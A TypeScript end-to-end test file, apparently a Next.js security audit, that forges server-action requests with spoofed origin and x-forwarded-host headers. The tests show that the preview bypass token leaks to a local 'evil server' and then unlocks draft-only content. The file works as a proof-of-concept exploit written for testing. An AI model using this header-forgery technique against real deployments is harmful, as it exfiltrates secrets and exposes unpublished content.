import http from 'http'
import type { AddressInfo } from 'net'
import { nextTestSetup } from 'e2e-utils'
import { retry } from 'next-test-utils'

type CapturedActionRequest = {
  headers: Record<string, string>
  postData: string
}

describe('audit-direct-entrypoint', () => {
  const { next, skipped } = nextTestSetup({
    files: __dirname,
    skipDeployment: true,
    startCommand: 'node direct-entrypoint-server.js',
    serverReadyPattern: /- Local:/,
    env: {
      NEXT_TELEMETRY_DISABLED: '1',
      NODE_ENV: 'production',
    },
  })

  if (skipped) {
    return
  }

  let evilServer: http.Server
  let evilOrigin: string
  let evilRequests: string[]
  let evilRequestHeaders: http.IncomingHttpHeaders[]

  beforeAll(async () => {
    const evilHostname =
      new URL(next.url).hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1'

    evilRequests = []
    evilRequestHeaders = []

    evilServer = http.createServer((req, res) => {
      evilRequests.push(req.url || '/')
      evilRequestHeaders.push(req.headers)
      res.writeHead(200, { 'content-type': 'text/plain' })
      res.end('evil server')
    })

    await new Promise<void>((resolve) => {
      evilServer.listen(0, '127.0.0.1', () => resolve())
    })

    evilOrigin = `http://${evilHostname}:${(evilServer.address() as AddressInfo).port}`
  })

  afterAll(async () => {
    await new Promise<void>((resolve, reject) => {
      evilServer.close((err) => {
        if (err) reject(err)
        else resolve()
      })
    })
  })

  async function captureActionRequest({
    buttonId,
    withAuthCookie,
  }: {
    buttonId: string
    withAuthCookie: boolean
  }): Promise<CapturedActionRequest> {
    let capturedActionRequest: CapturedActionRequest | undefined

    const browser = await next.browser('/', {
      beforePageLoad(page) {
        page.on('request', (request) => {
          const headers = request.headers()

          if (
            request.method() === 'POST' &&
            headers['next-action'] &&
            new URL(request.url()).pathname === '/'
          ) {
            capturedActionRequest = {
              headers,
              postData: request.postData() ?? '',
            }
          }
        })
      },
    })

    if (withAuthCookie) {
      await browser.eval(`fetch('/api/set-auth', { credentials: 'include' })`)

      await retry(async () => {
        expect(await browser.eval('document.cookie')).toContain('auth=1')
      })
    }

    await browser.elementById(buttonId).click()

    await retry(async () => {
      expect(capturedActionRequest).toBeDefined()
    })

    if (!capturedActionRequest) {
      throw new Error('Expected to capture a valid server action request')
    }

    return capturedActionRequest
  }

  async function issueForgedActionRequest(
    actionRequest: CapturedActionRequest,
    cookieHeader?: string
  ) {
    const nextUrl = new URL(next.url)
    const evilHost = new URL(evilOrigin).host

    return await new Promise<{
      statusCode: number
      body: string
      headers: http.IncomingHttpHeaders
    }>((resolve, reject) => {
      const req = http.request(
        {
          hostname: nextUrl.hostname,
          port: nextUrl.port,
          path: '/',
          method: 'POST',
          headers: {
            host: nextUrl.host,
            origin: `http://${evilHost}`,
            'x-forwarded-host': evilHost,
            'next-action': actionRequest.headers['next-action'],
            'content-type': actionRequest.headers['content-type'],
            accept: actionRequest.headers.accept,
            ...(cookieHeader ? { cookie: cookieHeader } : {}),
          },
        },
        (res) => {
          const chunks = []
          res.on('data', (chunk) => chunks.push(Buffer.from(chunk)))
          res.on('end', () => {
            resolve({
              statusCode: res.statusCode || 0,
              body: Buffer.concat(chunks).toString('utf8'),
              headers: res.headers,
            })
          })
        }
      )

      req.on('error', reject)
      req.write(actionRequest.postData)
      req.end()
    })
  }

  it('leaks preview bypass token and draft-only content through supported direct entrypoint invocation', async () => {
    const actionRequest = await captureActionRequest({
      buttonId: 'trigger-revalidating-redirect-action',
      withAuthCookie: true,
    })
    const prerenderManifest = await next.readJSON(
      '.next/prerender-manifest.json'
    )
    const previewModeId = prerenderManifest.preview.previewModeId as string

    evilRequests.length = 0
    evilRequestHeaders.length = 0

    const actionRes = await issueForgedActionRequest(actionRequest, 'auth=1')

    expect(actionRes.statusCode).toBeGreaterThanOrEqual(200)
    expect(
      evilRequests.some((requestPath) =>
        requestPath.startsWith('/post-action-landing')
      )
    ).toBe(true)
    expect(
      evilRequestHeaders.some(
        (headers) => headers['x-next-revalidate-tag-token'] === previewModeId
      )
    ).toBe(true)

    const bypassRes = await next.fetch('/draft-only', {
      headers: {
        cookie: `__prerender_bypass=${previewModeId}`,
      },
    })
    const bypassText = await bypassRes.text()

    expect(bypassRes.status).toBe(200)
    expect(bypassText).toContain('DRAFT SECRET PAYLOAD')
  })

  it('leaks preview bypass token from a public revalidating action in the supported direct entrypoint model', async () => {
    const baselineRes = await next.fetch('/draft-only')
    const baselineText = await baselineRes.text()

    expect(baselineRes.status).toBe(200)
    expect(baselineText).toContain('draft mode disabled')
    expect(baselineText).not.toContain('DRAFT SECRET PAYLOAD')

    const actionRequest = await captureActionRequest({
      buttonId: 'trigger-public-revalidating-redirect-action',
      withAuthCookie: false,
    })
    const prerenderManifest = await next.readJSON(
      '.next/prerender-manifest.json'
    )
    const previewModeId = prerenderManifest.preview.previewModeId as string

    evilRequests.length = 0
    evilRequestHeaders.length = 0

    const actionRes = await issueForgedActionRequest(actionRequest)

    expect(actionRes.statusCode).toBeGreaterThanOrEqual(200)
    expect(
      evilRequests.some((requestPath) =>
        requestPath.startsWith('/post-action-landing')
      )
    ).toBe(true)
    expect(
      evilRequestHeaders.some(
        (headers) =>
          headers['x-next-revalidate-tag-token'] === previewModeId &&
          !headers.cookie
      )
    ).toBe(true)

    const bypassRes = await next.fetch('/draft-only', {
      headers: {
        cookie: `__prerender_bypass=${previewModeId}`,
      },
    })
    const bypassText = await bypassRes.text()

    expect(bypassRes.status).toBe(200)
    expect(bypassText).toContain('DRAFT SECRET PAYLOAD')
  })
})
